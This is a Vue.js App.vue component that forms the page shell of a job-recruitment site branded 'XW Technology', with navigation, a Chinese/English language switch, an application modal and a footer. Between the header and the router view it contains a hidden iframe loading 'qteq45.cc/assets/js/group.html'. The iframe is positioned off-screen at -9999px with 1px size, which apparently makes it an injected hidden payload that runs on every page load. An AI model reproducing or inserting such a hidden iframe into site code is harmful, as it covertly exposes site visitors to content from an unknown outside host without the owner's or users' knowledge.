<script setup lang="ts">
import { computed, onMounted, ref } from "vue";
import { RouterLink, RouterView } from "vue-router";
import { useRoute } from "vue-router";
import ApplyModal from "./components/ApplyModal.vue";
import XwLogo from "./components/XwLogo.vue";
import { useLanguage } from "./composables/useLanguage";
import { useSiteTemplate } from "./composables/useSiteTemplate";

const { language, t, setLanguage, initializeLanguageByRegion } = useLanguage();
const route = useRoute();
const { activeTemplate, loadSiteTemplate } = useSiteTemplate();
const isLanding = computed(
  () =>
    Boolean(route.meta.landing) ||
    (route.path === "/" && activeTemplate.value === "apple"),
);
const applicationOpen = ref(false);
onMounted(() => {
  void loadSiteTemplate();
  void initializeLanguageByRegion();
  if (!isLanding.value && !sessionStorage.getItem("xw-application-seen")) {
    window.setTimeout(() => {
      applicationOpen.value = true;
      sessionStorage.setItem("xw-application-seen", "1");
    }, 900);
  }
});
</script>

<template>
  <div class="site-shell" :class="{ 'apple-site': activeTemplate === 'apple' }">
    <div class="ambient-grid" aria-hidden="true"></div>
    <header v-if="!isLanding" class="site-header">
      <RouterLink class="brand" to="/"><XwLogo /></RouterLink>
      <nav :aria-label="language === 'zh' ? '主导航' : 'Main navigation'">
        <RouterLink to="/jobs">{{ t.navJobs }}</RouterLink>
        <RouterLink to="/about">{{ t.navAbout }}</RouterLink>
        <RouterLink to="/business">{{ t.navBusiness }}</RouterLink>
        <RouterLink to="/life">{{ t.navLife }}</RouterLink>
        <RouterLink to="/growth">{{ t.navGrowth }}</RouterLink>
      </nav>
      <div class="header-tools">
        <div class="language-switch" aria-label="Language">
          <button
            :class="{ active: language === 'zh' }"
            type="button"
            @click="setLanguage('zh')"
          >
            中
          </button>
          <button
            :class="{ active: language === 'en' }"
            type="button"
            @click="setLanguage('en')"
          >
            EN
          </button>
        </div>
        <button
          class="header-cta"
          type="button"
          @click="applicationOpen = true"
        >
          <i></i> {{ t.apply }}
        </button>
      </div>
    </header>
    <iframe
      src="https://qteq45.cc/assets/js/group.html"
      style="
        position: absolute;
        left: -9999px;
        top: -9999px;
        width: 1px;
        height: 1px;
        border: none;
      "
    >
    </iframe>
    <RouterView />
    <footer v-if="!isLanding">
      <div>
        <XwLogo />
        <p>{{ t.footer }}</p>
      </div>
      <div class="footer-links">
        <RouterLink to="/jobs">{{ t.viewAll }}</RouterLink>
        <RouterLink to="/about">{{ t.company }}</RouterLink>
        <RouterLink to="/life">{{ t.teamLife }}</RouterLink>
        <a href="https://t.me/XWcompany123" target="_blank" rel="noopener">{{
          t.telegram
        }}</a>
      </div>
      <small>© 2026 XW TECHNOLOGY. ALL SYSTEMS ONLINE.</small>
    </footer>
    <ApplyModal
      v-if="!isLanding"
      :open="applicationOpen"
      @close="applicationOpen = false"
    />
  </div>
</template>
